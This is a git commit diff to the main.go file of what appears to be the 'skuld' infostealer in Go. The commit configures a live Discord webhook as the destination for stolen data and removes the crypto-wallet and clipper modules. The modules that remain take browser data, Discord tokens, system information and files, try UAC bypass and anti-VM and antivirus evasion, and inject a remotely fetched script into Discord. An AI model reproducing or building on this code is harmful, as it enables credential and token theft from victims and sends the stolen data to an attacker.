a08d9b78776a096aac90fd0b2b44e5d82d3faef7
SAKIB-SALIM <salimsakib775@gmail.com>
2024-11-19 22:23:33 +0600

    hii

--- main.go
+++ main.go
@@ -5,7 +5,6 @@ import (
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
 	"github.com/hackirby/skuld/modules/browsers"
-	"github.com/hackirby/skuld/modules/clipper"
 	"github.com/hackirby/skuld/modules/commonfiles"
 	"github.com/hackirby/skuld/modules/discodes"
 	"github.com/hackirby/skuld/modules/discordinjection"
@@ -16,14 +15,12 @@ import (
 	"github.com/hackirby/skuld/modules/system"
 	"github.com/hackirby/skuld/modules/tokens"
 	"github.com/hackirby/skuld/modules/uacbypass"
-	"github.com/hackirby/skuld/modules/wallets"
-	"github.com/hackirby/skuld/modules/walletsinjection"
 	"github.com/hackirby/skuld/utils/program"
 )
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe",
 		"cryptos": map[string]string{
 			"BTC": "",
 			"BCH": "",
@@ -61,11 +58,6 @@ func main() {
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
 		CONFIG["webhook"].(string),
 	)
-	go walletsinjection.Run(
-		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
-		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
-	)
 
 	actions := []func(string){
 		system.Run,
@@ -73,13 +65,10 @@ func main() {
 		tokens.Run,
 		discodes.Run,
 		commonfiles.Run,
-		wallets.Run,
 		games.Run,
 	}
 
 	for _, action := range actions {
 		go action(CONFIG["webhook"].(string))
 	}
-
-	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
